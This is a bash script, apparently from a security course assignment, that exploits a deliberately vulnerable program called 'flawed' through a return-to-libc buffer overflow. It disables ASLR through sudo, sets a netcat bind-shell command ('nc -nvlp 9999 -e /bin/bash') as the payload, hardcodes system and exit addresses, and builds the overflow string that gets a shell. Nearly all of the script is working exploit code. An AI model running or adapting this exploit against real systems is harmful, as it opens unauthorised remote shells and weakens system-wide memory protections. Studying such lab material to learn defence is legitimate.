#!/bin/bash

# Move to the assignment directory
cd ./assignment

# Compile the project
make

# Toggle ASLR randomization
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space' #disable
#sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space' #enable

# Set netcat payload as environment variable
export PAYLOAD="nc -nvlp 9999 -e /bin/bash"
echo "Estimated payload address is $(./getenv PAYLOAD)"

# Define address locations (little endian)
SYS_ADDR='\x10\x9d\xe1\xf7'  # use p system in GDB
EXIT_ADDR='\x70\xcf\xe0\xf7' # use p exit in GDB
PAY_ADDR='\xdb\xd4\xff\xff'  # verify using x/s <estimated addr> in GDB

echo "NOTE: Memory addresses use little endian encoding and may require tweaking"
echo "--------------------------------------------------------------------------"
echo "System address is $SYS_ADDR"
echo "Exit address is $EXIT_ADDR"
echo "Payload address is $PAY_ADDR"
echo "--------------------------------------------------------------------------"

# Run the assignment
# A's -> override buffer | B's -> overrun base pointer | C's -> override return address
# Set C's -> system addr | D's -> exit addr (graceful exit) | E's -> payload address of env variable
#./flawed $(python -c "print('AAAAAAAAAAAAA'+'BBBB'+'CCCC'+'DDDD'+'EEEE')")
./flawed $(python -c "print('A'*13 + 'B'*4 + '$SYS_ADDR' + '$EXIT_ADDR' + '$PAY_ADDR')") 

